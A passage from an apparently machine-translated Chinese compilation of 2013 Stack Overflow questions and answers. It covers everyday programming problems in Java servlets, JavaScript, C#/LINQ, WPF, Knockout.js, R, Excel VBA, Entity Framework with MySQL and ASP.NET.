        System.out.println("In the Login Servlet");
        LoginBean user = new LoginBean();
        user.setUserName(request.getParameter("username"));
        user.setPassword(request.getParameter("pass"));
        LoginDAO db = new LoginDAO();
        user = db.login(user);

        System.err.println("I am Back !");
        if(user.isValid())
        {
            System.err.println("VALIDED.. ReDirecting..");
            System.err.println("Getting Session");
            HttpSession session = request.getSession(true);
            System.err.println("Got Session");
            session.setAttribute("currentSessionUser",user);
            System.err.println("Attribute Set");
            response.sendRedirect("Login_Success.jsp");

        }else
        {
            System.err.println(" NOT VALIDED.. ReDirecting..");
            response.sendRedirect("Login_Failed.jsp");
           out.println(" NOT VALIDED.. ReDirecting.."); 

        }

    } catch (Throwable exc)
    {
        System.out.println(exc);
    }
} 
```

我添加了一些 System.err 以获取有关代码流的更多信息。

这就是我的玻璃鱼说的

```
INFO: In the Login Servlet
INFO: Driver loaded!
INFO: Database connected!
INFO: Welcome Ramesh
SEVERE: I am Back !
SEVERE: VALIDED.. ReDirecting..
SEVERE: Getting Session
SEVERE: Got Session
SEVERE: Attribute Set
INFO: java.lang.IllegalStateException
    at org.apache.catalina.connector.ResponseFacade.sendRedirect(ResponseFacade.java:524)
    at groovers.LoginServlet.doPost(LoginServlet.java:100)
    at javax.servlet.http.HttpServlet.service(HttpServlet.java:688)
    at javax.servlet.http.HttpServlet.service(HttpServlet.java:770)
    at org.apache.catalina.core.StandardWrapper.service(StandardWrapper.java:1550)
    at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:281)
    at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:175)
    at org.apache.catalina.core.StandardPipeline.doInvoke(StandardPipeline.java:655)
    at org.apache.catalina.core.StandardPipeline.invoke(StandardPipeline.java:595)
    at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:161)
    at org.apache.catalina.connector.CoyoteAdapter.doService(CoyoteAdapter.java:331)
    at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:231)
    at com.sun.enterprise.v3.services.impl.ContainerMapper$AdapterCallable.call(ContainerMapper.java:317)
    at com.sun.enterprise.v3.services.impl.ContainerMapper.service(ContainerMapper.java:195)
    at com.sun.grizzly.http.ProcessorTask.invokeAdapter(ProcessorTask.java:860)
    at com.sun.grizzly.http.ProcessorTask.doProcess(ProcessorTask.java:757)
    at com.sun.grizzly.http.ProcessorTask.process(ProcessorTask.java:1056)
    at com.sun.grizzly.http.DefaultProtocolFilter.execute(DefaultProtocolFilter.java:229)
    at com.sun.grizzly.DefaultProtocolChain.executeProtocolFilter(DefaultProtocolChain.java:137)
    at com.sun.grizzly.DefaultProtocolChain.execute(DefaultProtocolChain.java:104)
    at com.sun.grizzly.DefaultProtocolChain.execute(DefaultProtocolChain.java:90)
    at com.sun.grizzly.http.HttpProtocolChain.execute(HttpProtocolChain.java:79)
    at com.sun.grizzly.ProtocolChainContextTask.doCall(ProtocolChainContextTask.java:54)
    at com.sun.grizzly.SelectionKeyContextTask.call(SelectionKeyContextTask.java:59)
    at com.sun.grizzly.ContextTask.run(ContextTask.java:71)
    at com.sun.grizzly.util.AbstractThreadPool$Worker.doWork(AbstractThreadPool.java:532)
    at com.sun.grizzly.util.AbstractThreadPool$Worker.run(AbstractThreadPool.java:513)
    at java.lang.Thread.run(Thread.java:722) 
```

请帮我解决这个问题。

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2013-03-13T17:45:04.933

我认为在你打电话之前`sendRedirect()`，回应是承诺。这意味着服务器已经将标头刷新到客户端。这通常会在响应缓冲区达到最大大小或有人显式调用 flush() 时发生。

由于响应已经提交，您不能再添加任何标头。并且因为`sendRedirect()`需要`Location`将标头添加到响应中。

服务器会抛出`IllegalSateException`异常。

**如何修复它？**

确保在执行之前没有写入任何数据`sendRedirect()`。在您的代码中，我怀疑`processRequest()`方法正在写入响应。

请在此处找到响应将被提交的原因。

[Servlet“响应已提交”的原因](https://stackoverflow.com/questions/11305563/cause-of-servlets-response-already-committed)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-13T17:41:06.423

如果您在响应已提交时尝试写入响应，则可能会发生这种情况。

如果不查看更多代码，很难确定发生这种情况的确切位置，但您可以使用以下命令进行检查：

```
response.isCommitted() 
```

如果返回 true，则输出已提交，您将无法重定向。

可以通过刷新、到达 servlet 的末尾或已写入输出流来提交响应

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-03-13T17:45:54.700

您需要添加

```
return; 
```

后

```
response.sendRedirect("Login_Success.jsp"); 
```

和

```
response.sendRedirect("Login_Failed.jsp"); 
```

这是响应后转发的问题。

您可以从链接中了解要求 - [java.lang.IllegalStateException: Cannot (forward | sendRedirect | create session) after response has been commited](https://stackoverflow.com/questions/2123514/java-lang-illegalstateexception-cannot-forward-after-response-has-been-committe)

# javascript - 比较当前日期和未来日期

> ID：15392424
> 
> 赞同：0
> 
> 时间：2013-03-13T17:34:09.717
> 
> 标签：javascript

**情况** 我有一个来自 Oracle 数据库的动态表。有一个名为“ScheduledTime”的列，它是一个 TIMEStamp/shortTime，并且该变量与客户端 JavaScript 数字时钟进行比较。如果 scheduleTime 变量在当前时间（js 时钟）的特定时间范围内，则我们在表行上返回操作。

即如果“scheduledTime”<=currentTime 的 15 分钟，则将行着色为红色

**问题** 当它的 23:00（晚上 11 点）并且有一个项目安排在凌晨 2 点（第二天）时，逻辑认为该项目迟到了，因为它的读数为“2”，而且表格行颜色为红色。

**问题/可能的解决方案** 我想我应该在颜色编码之前运行一个条件，以比较时间戳日期而不是时间。如果日期不相等，则不要执行颜色逻辑......你的想法是什么......

当前代码

```
 var t = new Date();

 for (var i = 1, row; row = tbl.rows[i]; i++) {
        var hm = row.cells[0].innerText.split(":");
        t.setHours(hm[0], hm[1], 0, 0);
        var r = (t.getTime() - current.getTime()) / 1000 / 60 / 60;

        if(r <= 0.25)
            row.className = "Red";
        else if (r > 0.25 & r <= 0.5)
            row.className = "Yellow";
        else if (r > 0.5 & r <= 2)
            row.className = "Green"; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-13T17:55:18.677

该库将帮助您将表格中的日期文本解析为真正的 JS Date() 对象，您可以使用该对象进行进一步的比较/操作：

[https://code.google.com/p/datejs/#Parsing](https://code.google.com/p/datejs/#Parsing)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-13T17:44:32.627

在一些需要进行时间范围计算的项目中，我使用了矩范围 JavaScript 库：[https ://github.com/gf3/moment-range](https://github.com/gf3/moment-range)

它应该能够处理你需要的东西。但是，您需要使用完整的日期和时间。

# c# - LINQ to Entities 无法识别方法 'System.String ToBase64String(Byte[])' 方法，

> ID：15392425
> 
> 赞同：-1
> 
> 时间：2013-03-13T17:34:10.137
> 
> 标签：c#, linq, linq-expressions

LINQ to Entities 无法识别方法 'System.String ToBase64String(Byte[])' 方法，并且此方法无法转换为存储表达式。

```
 var activityList = (from item in committeeMemberList
                let committee = db.Committee.FirstOrDefault(x => x.Committee_Id == item.Committee_Id)
                let contact = db.Contacts.FirstOrDefault(x => x.Contact_Id == item.Contact_Id)
                select new Activity
                {
                   Id = Convert.ToBase64String(item.Committee_Member_SPE_Id), 
                   Name = committee.Committee_Name, 
                   ...
                   ...

                  }).ToList(); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-13T17:39:21.410

更改您的 LINQ，以便您的原始语句返回匿名对象列表，然后在该列表上选择并使用 ToBase64String 函数：

```
var activityList = 
            (from item in
                (from member in committeeMemberList
                let committee = db.Committee.FirstOrDefault(x => x.Committee_Id == item.Committee_Id)
                let contact = db.Contacts.FirstOrDefault(x => x.Contact_Id == item.Contact_Id)
                select new
                {
                   Id = member.Committee_Member_SPE_Id, 
                   Name = committee.Committee_Name, 
                   ...
                   ...
                 }).ToList())
            select new Activity
            {
               Id = Convert.ToBase64String(item.Id), 
               Name = committee.Committee_Name, 
               ...
               ...

            }).ToList(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-04-10T12:54:07.943

```
 var activityList = 
                (from item in
                    (from member in committeeMemberList
                    let committee = db.Committee.FirstOrDefault(x => x.Committee_Id == item.Committee_Id)
                    let contact = db.Contacts.FirstOrDefault(x => x.Contact_Id == item.Contact_Id)
                    select new
                    {
                       Id = member.Committee_Member_SPE_Id, 
                       Name = committee.Committee_Name, 
                       ...
                       ...
                     }).ToList());
//After Collecting information just update current value to base4string using following Syntax

activityList.ForEach(s=>s.id=(s.id==null?"noimage":Convert.ToBase4String(s.id)); 
```

# c# - UIElement 中的值更改后执行方法

> ID：15392435
> 
> 赞同：2
> 
> 时间：2013-03-13T17:34:51.233
> 
> 标签：c#, wpf, animation, uielement

是否可以订阅 WPF 中特定 UIElement 的属性？

我想`UIElement`在 Heightvalue 更改后立即为 an 设置动画并将新高度添加到列表中，但我看不到如何订阅 HeightProperty？

## 示例代码：

像这样的东西：

MainWindow.xaml：

```
<Window x:Class="BibVisualization.MainWindow"
    xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml">
<Grid>
    <Grid.RowDefinitions>
        <RowDefinition />
        <RowDefinition Height="Auto"/>
    </Grid.RowDefinitions>

    <Border Background="Red" Width="30" Grid.Row="0" x:Name="myBorder">
        <TextBlock Text="Really really long text with wrapping, but the wrapping changes based on border's width"
               Width="{Binding ElementName=myBorder, Path=Width}"
               TextWrapping="Wrap" />
    </Border>
    <Button Grid.Row="1" Height="10" 
        Content="Make border bigger" Click="OnButtonClick" />
</Grid>
</Window> 
```

主窗口.xaml.cs

```
private void OnButtonClick(Object sender, RoutedEventArgs e)
{
    myBorder.Width += 10;
    //Bind to textblock's actualheight and execute OnHeightChange?
}

private int accumulatedChange;

private void OnHeightChange(Object sender, SomeEventArgs? e)
{
    accumulatedChange -= e.OldValue (if possible);
    accumulatedChange += e.NewValue;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-13T19:51:34.373

我认为你可以使用 FrameworkElement 类的[SizeChanged](http://msdn.microsoft.com/en-us/library/system.windows.frameworkelement.sizechanged.aspx) -Event 来做你想做的事。所有`UIElement`诸如`Button`或`Textblock`派生自该类的s，因此提供事件。

传递给注册方法的[SizeChangedEventArgs](http://msdn.microsoft.com/en-us/library/system.windows.sizechangedeventargs.aspx)包含高度或宽度是否已更改的信息，并提供新值。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-13T20:38:21.497

您可以使用为属性`DependencyPropertyDescriptor`添加一个：`ValueChangedHandler`

```
DependencyPropertyDescriptor descriptor=DependencyPropertyDescriptor.FromProperty(UIElement.HeightProperty,typeof(UIElement));
descriptor.AddValueChanged(myUIElementToWatch, new EventHandler(OnHeightOfUiElementChanged)); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-13T20:50:52.317

如果我理解正确，您想“绑定”到`ActualHeight`?

看看这个链接（[http://meleak.wordpress.com/2011/08/28/onewaytosource-binding-for-readonly-dependency-property/](http://meleak.wordpress.com/2011/08/28/onewaytosource-binding-for-readonly-dependency-property/)） - 它基本上描述了如何使用附加属性来完成。

也看看我前几天的这个答案，它基本上描述了非常相似的问题。
[https://stackoverflow.com/a/15367642/417747](https://stackoverflow.com/a/15367642/417747)
（使用那里的链接下载支持代码 - 您可以通过`Style`或如文章中所述绑定到 - 都是类似的东西）

您需要`ActiveHeight`使用本文中描述的方法进行绑定，该方法会更改您的视图模型的`MyHeight`属性 -`set`在活动高度更改时处理它。如果有任何问题，请告诉我。

希望能帮助到你。

# c# - 32 位 winform 应用程序不能在 64 位操作系统上运行

> ID：15392438
> 
> 赞同：3
> 
> 时间：2013-03-13T17:34:59.047
> 
> 标签：c#, winforms

我有两台笔记本电脑。

1) BuildLaptop-> 我编写应用程序的笔记本电脑。Windows 7 Ultimate 32 位，Office 2007 数据库

2)TestLaptop-> 测试应用程序。Windows 7 终极版 64 位，Office 2007。

我的应用程序包含几个构建为 AnyCPU 的 dll 文件，并且该应用程序也构建为 AnyCPU。

当我尝试在 TestLaptop 上测试我的应用程序时，它给了我一个错误：

> Microsoft.ACE.OleDb.12.0 提供程序未在您的计算机上注册。

所以我从 TestLapTop 中卸载了 Office，并在 BuildLapTop 上安装了 Office。

同样的错误。然后我尝试将所有 dll 以及我的应用程序编译到 x64。应用程序无法启动。然后我尝试只将应用程序编译到 x64 并将 dll 编译到 anyCPU。错误再次发生。

那么请帮助我如何让我的应用程序在 TestLapTop 上运行？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-13T17:38:32.097

您需要像`/platform:x86`使用任何 32 位非托管资源（DLL 等）一样编译任何项目。

![在此处输入图像描述](../Images/61d9936336770bd604e89790cacae0f3.png)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-13T17:49:26.813

根据您的评论，我不确定您是否会遇到此问题。如果您安装了任何 Microsoft Office 程序：

*   单词
*   外表
*   Excel
*   微软幻灯片软件
*   ETC

如果它们是*32 位修订版*，则您无法安装*64 位访问数据库引擎*，它会给您以下异常：

![例外](../Images/6380537c6b155955fdc0ca6828cad0d0.png)

这将迫使您将*32 位修订版*安装到您的*64 位机器*上。您可能还需要通过管理工具对*ODBC 数据源中的数据库进行一些额外的配置。*

![ODBC 数据源](../Images/ee70a4623595acd127ac32d898befed3.png)

希望这至少可以澄清您在评论中提到的错误。至于编译，Sixlettervariables 有一个解决方案。

希望这会有所帮助。

# php - 客户注册购物车软件错误

> ID：15392439
> 
> 赞同：0
> 
> 时间：2013-03-13T17:35:01.087
> 
> 标签：php, json, opencart

1.  如果错过了会员代码（未输入）。它不会像电子邮件或姓氏那样给出错误。第 148 行。我刚刚为affiliate_code 添加了电子邮件或姓氏等

cart.open-pages.com 可以访问、购买、结帐、注册。

.2 由于第 157 到 160 行，我遇到了错误，谁能告诉我 [http://pastebin.ca/2331831](http://pastebin.ca/2331831)中的代码是否正常。它给出了一个内部服务器错误

其他相关文件 [http://pastebin.ca/2331818](http://pastebin.ca/2331818) 位于视图>主题>默认>模板>结帐>register.tpl

提前致谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-13T19:09:36.327

似乎您正在阅读`affiliate_code`而不是检查它是否为空。在将它传递给查询之前，您应该使用[空函数。](http://php.net/empty)

```
if( ! empty($_POST['affiliate_code']))
{
    // your affiliate code here
} 
```

# android - cc2540的android连接问题

> ID：15392442
> 
> 赞同：1
> 
> 时间：2013-03-13T17:35:19.613
> 
> 标签：android, bluetooth-lowenergy, rssi

我正在为最后一年的学位项目开发一个非常简单的应用程序，它是一个简单的接近应用程序，一旦蓝牙设备超出范围，它就会创建一个触发警报的主管超时。

我的主要问题实际上是试图与 TI CC2540 (KeyFob) 建立连接。我已经加载了 TI 提供的演示软件，与 Btool 等配合使用都很好，我正在使用与 CC2540 配对的 HTC Desire C（ICS，BT4.0）。我已经组装了一个 APP，但最近从 Android SDK 下载了 BTChat 示例。示例应用程序可以识别 Keyfob，甚至可以获取正确的 Mac 地址，但是一旦我尝试连接它，它就无法连接（建立链接）。我进行了大量研究，并认为我的问题可能出在 UUID (128) 区域，但我无法为设备找到正确的 UUID。顺便说一句，我使用了 Android 开发网站上的常见版本，以及衍生产品，但没有成功。

我最终找到了一个用于 Iphone（蓝牙智能扫描仪）的现有应用程序，它确实识别了我的设备，但对 UUID 给出了“空”响应。

我不知道该去哪里，有人能指出我正确的方向吗？

最好的问候韦恩

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-14T00:41:01.517

根据[gsmarena](http://www.gsmarena.com/htc_desire_c-4759.php)的规格，HTC Desire C 实际上可能只有蓝牙 3.0，而不是 4.0“低能耗”（HTC 自己的网站甚至没有提到蓝牙——参见[HTC 网站规格](http://www.htc.com/www/smartphones/htc-desire-c/#specs)？）。Android SDK 也不支持蓝牙低功耗......所以你可能不走运。有一些受支持的 Broadcom 堆栈，摩托罗拉有自己的堆栈......三星 Galaxy S3 可能会通过对现有应用程序进行逆向工程来工作......

如果您需要一款支持蓝牙 LE 的手机，下载 Motorola ICS_R2 Android SDK 插件即可使用 Motorola XT885。看到这篇文章：[摩托罗拉 BLE API](https://stackoverflow.com/questions/13272310/android-4-0-4-ble-api-broadcom-motorola)

# javascript - 传入 observableArray 作为函数参数

> ID：15392445
> 
> 赞同：1
> 
> 时间：2013-03-13T17:35:29.277
> 
> 标签：javascript, jquery, mvvm, knockout.js, knockout-sortable

我想要实现的目标：一个带有一个文本输入字段（名称）的表单，两个带有一些选项（类型和列）的选择字段以及一个提交按钮，该按钮创建一个标题设置为名称的小部件，数据类型设置为类型和列 - 是它在页面中的位置。

在这种情况下，类型在视图中定义了几个不同的选项，它的工作原理很花哨，所以我现在不会讨论我是如何让它工作的。

到目前为止，我有一个包含三列的页面，每一列都是它自己的 observableArray - 就像这样：

```
self.col0 = ko.observableArray([]);
self.col0.id = 'col0' 
```

col1 和 col2 也是如此。我的目标是让选择字段指向这些数组。至少这是我认为我需要做的。

我有一个 createWidget 函数，它查看 DOM 中的 Name 和 Type 值（如果我在这里错了，请纠正我，这是我用 KnockOut 创建的第一件事）并从该数据创建一个新的 Widget - 比如所以：

```
var Widget = function(name, type) {
  var self  = this;
  self.name = name;
  self.type = type;
}; 

var ViewModel = function() {
  var self = this;
  self.newWidgetName = ko.observable();
  self.newType       = ko.observable();

// Unrelated code in between

self.createWidget = function(target) {
  newName = self.newWidgetName();
  newType = self.newType();
  widget  = new Widget(newName, newType);
  target.unshift(widget)
  self.newWidgetName("");
}; 
```

DOM 中的输入/选择元素

```
input.widget-name type="text" placeholder="wName" data-bind="value: newWidgetName"

select data-bind="value: newType"
  option value="calendar" Calendar
  option value="article"  Article
  option value="document" Document

select.colPick data-bind="value: colPick"
  option value="col0" Column 1
  option value="col1" Column 2
  option value="col2" Column 3 
```

还有我的 createWidget 函数的点击处理程序 - 像这样：

```
a.btn.create-widget data-bind="click: function(){ createWidget(col0); }" 
```

**沙赞，它有效！**

但是，这只会将新的小部件输出到第一个列 (col0)，它不会考虑列选择字段的值，也不会将新的小部件移动到正确的列中。经过多次试验和错误后，我遇到的错误几乎可以归结为：

1）“无法调用未定义的方法unshift”

2）“未捕获的TypeError：对象函数observable（）......没有方法'unshift'

因此，到目前为止，代码看起来像上面的示例，无论如何它并不理想，但不同的列与可淘汰排序相关联，如果必须废弃此功能，这并不是什么大问题。用户仍然可以将小部件从 col0 移动到 col2，反之亦然。

如果有人有资源可以为我指明正确的方向，或者他们袖手旁观的答案 - 随时分享！

一切顺利，卡斯。

**编辑：Tyrsius 的后续问题**

使用您提供的代码，我现在可以在选择框中使用三列，但是在将小部件输出到视图中时我有点挣扎。

使用我之前的代码，视图如下所示：

```
<div class="cols">
  <div class="col col-25">
    <ul data-bind="sortable: { template: 'widgetTmpl', data: col0, afterMove: $root.widgetData }">
    </ul>
  </div>
  <div class="col col-50">
    <ul data-bind="sortable: { template: 'widgetTmpl', data: col1, afterMove: $root.widgetData }">
    </ul>
  </div>
  <div class="col col-25">
    <ul data-bind="sortable: { template: 'widgetTmpl', data: col2, afterMove: $root.widgetData }">
    </ul>
  </div>
</div> 
```

我现在正在使用的是：

```
<div data-bind="foreach: columns">
  <div data-bind="foreach: items" class="col">
    <ul data-bind="sortable: { template: 'widgetTmpl', data: columns, afterMove: $root.widgetData }"></ul>
  </div>
</div> 
```

我的第一个问题，我意识到我当时并没有考虑，所以跳过那个。

问题 #2：我现在如何将这些小部件绑定到我在表单中选择的 col？我会这样做吗？

```
<ul data-bind="sortable: { template: 'widgetTmpl', data: entryColumn, afterMove: $root.widgetData }"></ul> 
```

还是我走远了？:)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-14T16:03:48.873

我会将列上的项目集合保留为一种类型，如下所示：

```
var Column = function(header) {
    this.header = ko.observable(header);
    this.items = ko.observableArray([]);
}; 
```

诀窍是将列`select`直接绑定到视图模型上的列列表：

```
<select data-bind="options: columns, optionsText: 'header', value: entryColumn" 
```

这里发生的是`column`下拉选择的实际对象将存储在`entryColumn`属性中。稍后我们可以将项目直接放入其`items`列表中，因为我们将对其进行引用。这也允许我们在不改变逻辑的情况下支持任意数量的列。

添加代码将保持简单：

```
self.columns = ko.observableArray(columns);

self.entryName = ko.observable('');
self.entryType = ko.observable('');
self.entryColumn = ko.observable('');
self.types = ko.observableArray(['Small', 'Medium', 'Large']);

self.addWidget = function() {
        var widget = new Widget(self.entryName(), self.entryType());
        //Here is where we can directly add to the selected columns item list
        self.entryColumn().items.push(widget);
        self.resetForm();
    }; 
```

这是演示这些[的小提琴。](http://jsfiddle.net/eMvhb/)

* * *

**后续问题**

你很接近，但数据`items`不是`EntryColumn`

```
<div data-bind="foreach: columns">
    <div data-bind="sortable: { template: 'widgetTmpl', data: items}" class="column">        
    </div>
</div>

<script type="text/html" id="widgetTmpl">
    <p data-bind="text: name() + ' - ' + type()"></p>
</script> 
```

这是[更新的小提琴](http://jsfiddle.net/tyrsius/NKYmh/1/)。

# r - 在 R 中为矩阵创建一个新类

> ID：15392446
> 
> 赞同：0
> 
> 时间：2013-03-13T17:35:37.190
> 
> 标签：r, class, object, methods, matrix

我有一些函数采用非常特定的矩阵，并在使用我制作的另一个函数时加载了特定的信息。目前该函数接受的矩阵是正常的 R 矩阵类型。但是我想将它们分配为不同的类型或类，以便实现简单的输入检查，这样用户就不能将任何矩阵放入函数中。

在网上看到几个例子后，我认为 S3 方法会很简单：

```
mat1 <- matrix(c(1:10),ncol=5)

colnames(mat1) <- c("ONE","TWO","THREE","FOUR","FIVE")

as.sdpmgdna <- function(x) {
  class(x) <- "sdpmgdna"
  return(x)
}

mat2 <- as.sdpmgdna(mat1) 
```

就好像我返回 mat2 我看到一个矩阵一样，这似乎是有效的，如果我通过 indecies mat2[1,2] 调用它，我会得到我应该得到的正确值。但是我不能确定有些事情已经改变了——它现在被描述为 sdpmgdna[10] 即它似乎忽略了它有 2 个维度，尽管执行上述操作并将 mat2 打印到屏幕上显示它确实有 2 个维度。另一个奇怪的事情是，如果我这样做`colnames(mat2)`，它们就会被退回。但是，如果我尝试查找单个列的 colname，例如`colname(mat2[,4])`，则返回的值是`NULL`. 任何人都可以解释为什么这是或我应该做什么 - 我真的希望它基本上是一个矩阵，但是因为函数要求它在什么和多大的矩阵方面非常具体，将它定义为另一个类会错误和输入检查更容易 - 并允许我使用 R 的方法机制，所以我所有的自定义绘图函数都可以只是 plot() 的方法。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-13T17:49:37.813

如果您使用`colnames`普通矩阵的单个列，您还会得到`NULL`：

```
colnames(mat1[,1])
NULL
dim(mat1[,1])
NULL
dim(mat1[,1,drop=FALSE])
[1] 2 1
colnames(mat1[,1,drop=FALSE])
[1] "ONE" 
```

另一个问题是，由于您的新矩阵没有`matrix`类，因此需要类对象的方法`matrix`将不起作用。最好也`matrix`作为类属性给出：

```
isSymmetric(mat2)
Error in UseMethod("isSymmetric") : 
  no applicable method for 'isSymmetric' 
  applied to an object of class "sdpmgdna"
class(mat2)<-c("sdpmgdna","matrix")
isSymmetric(mat2)
[1] FALSE 
```

请注意，即使没有矩阵类，有些事情也可以作为：

```
class(mat2)<-c("sdpmgdna")
is.matrix(mat2)
[1] TRUE 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-13T18:01:14.727

你应该改变

```
class(x) <- "sdpmgdna" 
```

到

```
class(x) <- c("sdpmgdan", "matrix") 
```

这样R首先搜索您的类方法，如果没有找到它们，它将使用矩阵方法

# vba - 将工作表复制到新工作簿并让按钮指向新工作簿中的宏？

> ID：15392447
> 
> 赞同：-1
> 
> 时间：2013-03-13T17:35:39.700
> 
> 标签：vba, excel, excel-2010

我有一个看起来像表格的工作表。它有一个“重置”按钮来清除这些值。

我可以运行一个宏，将该工作表复制到一个新的工作簿中，然后通过电子邮件将其发送给某人。包含宏的模块被复制到其中，一切都差不多了。问题是，运行重置宏的工作表上的按钮仍然指向原始文档。我怎样才能让它指向它本身的宏？

**编辑：**要指出的一件事是，如果单元格发生更改，我在该工作表中确实有宏。这些效果很好，不要尝试加载原始文件。只是按钮内的那些不起作用。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-14T10:56:37.900

您应该使用“ActiveX 表单按钮”而不是“简单表单按钮”（我猜您会使用它）。然后您必须在 ActiveX 按钮事件中放置重置程序（双击它以编辑该程序）。作为处理工作表的结果，按钮和程序都将移至新工作簿，这将破坏对原始文件的任何引用。

# mysql - 无法在 Entity Framework 5 中使用 MySql Code First 配置关联。

> ID：15392450
> 
> 赞同：0
> 
> 时间：2013-03-13T17:35:48.503
> 
> 标签：mysql, ef-code-first, entity-framework-5

做同样的例子： [http ://weblogs.asp.net/manavi/archive/2011/04/24/associations-in-ef-4-1-code-first-part-4-table-splitting.aspx](http://weblogs.asp.net/manavi/archive/2011/04/24/associations-in-ef-4-1-code-first-part-4-table-splitting.aspx)

```
public class Order {
    public int OrderId {get;set;}
    public virtual OrderBilling Billing { get; set; }
}

public class OrderBilling {
    public int OrderBillingId { get; set; }
    public string Name { get; set; }
}

public DbSet<Order> Orders { get; set; }
public DbSet<OrderBilling> OrderBilling { get; set; }

public class OrderConfiguration : EntityTypeConfiguration<Order> {
    public OrderConfiguration() {
    HasRequired(o => o.Billing)
        .WithRequiredPrincipal();
}
} 
```

在 Microsoft SQL 中运行良好。但是在 MySQL 上执行时，它会创建表并在生成中的某处（我认为在应用 FK 时）它会抛出一个：

```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'Order (OrderId)
ON DELETE NO ACTION ON UPDATE NO ACTION' at line 3 
```

我使用连接器 6.6.5 和实体框架 5。

这是连接器的问题吗？用方法？我应该添加一些 MySql 配置来支持这个吗？提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-18T13:24:04.773

问题是因为使用 Order 作为表名，并且在 SQL 语句中有一个地方没有使用“order”。

将表名更改为 SalesOrder，一切又开始完美运行。

# mysql - 如何从存储在 MySql 中的 URL 字符串中提取查询字符串值并将它们保存在新字段中？

> ID：15392452
> 
> 赞同：2
> 
> 时间：2013-03-13T17:35:52.347
> 
> 标签：mysql, sql, database, field, text-extraction

我在 MySql 数据库的表“test”中有一个字段“url”，其中包含一个带有查询字符串的 URL，例如

[http://www.mydomain.com?q=xxxx&p=yyyy](http://www.mydomain.com?q=xxxx&p=yyyy)

我创建了两个字段“query_q”和“query_p”来将查询值存储在表中，但是我可以创建一个 SQL 来从“url”字段中提取每个查询字符串值并将它们保存在新字段中？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-13T17:48:52.433

您可以使用`LOCATE()`and`SUBSTR()`正如 Barmar 所说：

请参阅[SQL 小提琴](http://sqlfiddle.com/#!2/77900/2/0)。

```
update t1 set 
q=substr(url, locate('?q=',url)+3, locate('&p=',url)-locate('?q=',url)-3),
p=substr(url, locate('&p=',url)+3, length(url)-locate('&p=',url)-2); 
```

当然，要让它起作用，q 必须是第一个参数，前面是 '?' 第二个是“p”。但如果没有，你可以弄清楚;）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-13T17:49:40.620

如果您只需要一个快速而肮脏的解决方案，这可能会有所帮助：

```
UPDATE urls
SET
  query_q = SUBSTRING_INDEX(SUBSTRING_INDEX(url, '?q=', -1), '&p=', 1),
  query_p = SUBSTRING_INDEX(url, '&p=', -1) 
```

请[在此处](http://sqlfiddle.com/#!2/2405f/1)查看小提琴。

# c# - Request.Form 提供来自动态文本框的额外值

> ID：15392454
> 
> 赞同：1
> 
> 时间：2013-03-13T17:35:53.673
> 
> 标签：c#, javascript, asp.net

我正在使用动态文本框，然后在文件后面的代码中获取它们的值。我正在使用 Javascript 创建这些框。我的 asp.net 页面代码是

```
 <script type="text/javascript">

        $(document).ready(function () {

            var counter = 1;

            $("#addButton").click(function () {

                if (counter > 10) {
                    alert("Only 10 textboxes allow");
                    return false;
                }

                var newTextBoxDiv = $(document.createElement('div'))
                     .attr("id", 'TextBoxDiv' + counter);

                newTextBoxDiv.html('<input type="text" name="textbox' + counter +
                      '" id="textbox' + counter + '" value="" >');

                newTextBoxDiv.appendTo("#TextBoxesGroup");
                counter++;
                return false;
            });
        });
    </script>

</head>

<body>

    <form id="form2" runat="server">

        <h1>jQuery add / remove textbox example</h1>

        <asp:TextBox runat="server" ID="txt1" type='text' name="textname" />
        <asp:Panel runat="server" ID='TextBoxesGroup'>
        </asp:Panel>
        <asp:LinkButton ID="addButton" runat="server">Add TextBox</asp:LinkButton>

        <asp:Button ID="Button1" runat="server" Text="Button" OnClick="Button1_Click" />
    </form>
    <asp:Label ID="Label1" runat="server" Text=""></asp:Label>
</body> 
```

我在页面上显示了一个文本框，当没有创建动态文本框时，它应该只显示一个值。我的 C# 代码是

```
 protected void Button1_Click(object sender, EventArgs e)
    {
        string name = txt1.Text + ",";
        if (TextBoxesGroup.Controls.Count  > 0)
        {           
            for (int i = 1; i <= TextBoxesGroup.Controls.Count; i++)
            {
                name += Request.Form["textbox" + i] + ",";
            }    
        }

        Label1.Text = name;
    } 
```

在 asp:button 点击​​它应该显示由 (,) 分隔的所有值。但它只显示前 2 个值，其中一个是 asp:Textbox，第二个是动态文本框，我想要动态创建的所有文本框的值，当没有添加动态文本框时，它应该只显示来自 asp 的值：文本框...提前致谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-13T17:39:53.540

在客户端通过 javascript 创建的Html`input`元素不会出现在`TextBoxesGroup.Controls`服务器上。

